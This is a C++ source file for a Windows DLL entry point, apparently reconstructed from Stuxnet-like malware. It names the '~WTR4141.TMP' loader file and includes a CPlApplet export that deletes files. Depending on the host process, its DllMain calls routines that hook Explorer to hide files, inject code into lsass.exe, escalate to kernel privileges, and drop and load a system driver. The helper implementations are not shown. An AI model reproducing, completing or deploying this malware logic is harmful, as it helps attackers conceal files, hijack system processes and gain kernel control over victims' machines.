#include"include.h"

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	if (ul_reason_for_call == DLL_PROCESS_DETACH)
	{
		OutputDebugString(L"dll uninstall");
		return TRUE;
	}
	if (!ul_reason_for_call || ul_reason_for_call != DLL_PROCESS_ATTACH)
		return TRUE;
	
	DisableThreadLibraryCalls(hModule);

	wchar_t _path[MAX_PATH] = { 0 };
	HMODULE h = NULL;
	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)LoadFromMemory, &h);
	GetModuleFileNameW(h, _path, MAX_PATH);
	std::wstring cfile;
	cfile.append(_path);
	int pos = cfile.rfind(L"\\", cfile.length());
	cfile = cfile.substr(pos + 1, -1);
	OutputDebugString(cfile.c_str());
	if (_wcsicmp(cfile.c_str(), L"~WTR4141.TMP") == 0)
	{
		//call LoadFromMemory
		OutputDebugString(L"start call LoadFromMemory");
		LoadFromMemory();
	}
	else if (_wcsicmp(cfile.c_str(), L"explorer.exe") == 0)
	{
		//call hide file apihook
		OutputDebugString(L"start call hide file apihook");
		exp_ring3_hide_file();
		//注入到lsass.exe进程
		OutputDebugString(L"start inject to lsass.exe");
		exp_inject_lsass();
	}
	else if (_wcsicmp(cfile.c_str(), L"KERNEL32.DLL.ASLR") == 0)	//此时cfile为123.dll
	{
		//GetModuleFileNameW(0, _path, MAX_PATH);//这个是lsass.exe
		//提权
		OutputDebugString(L"start get priv to lsass.exe");
		exp_ring0_get_priv();
		OutputDebugString(L"start to drop sys driver");
		dropSysDriver();
		OutputDebugString(L"start install sys driver");
		loadSysDriver();
	}
	else
	{
		OutputDebugString(L"unknow call");
	}
	return TRUE;
}

HRESULT __stdcall DllUnregisterServer(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	OutputDebugString(L"DllUnregisterServer");
	return 0;
}

HRESULT __stdcall DllCanUnloadNow(void)
{
	OutputDebugString(L"DllCanUnloadNow");
	return 0;
}

HRESULT __stdcall DllGetClassObject(const IID* const rclsid, const IID* const riid, LPVOID* ppv)
{
	OutputDebugString(L"DllGetClassObject");
	return 0;
}

// 100% (C) CODE MATCH
HRESULT __stdcall DllRegisterServer(void)
{
	OutputDebugString(L"DllRegisterServer");
	return 1;
}

// 100% (C) CODE MATCH
LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
{
	OutputDebugString(L"CPlApplet");
	if (*(DWORD*)(hwndCPl + 2))
		DeleteFileA(*(LPCSTR*)(hwndCPl + 2));
	return 1;
}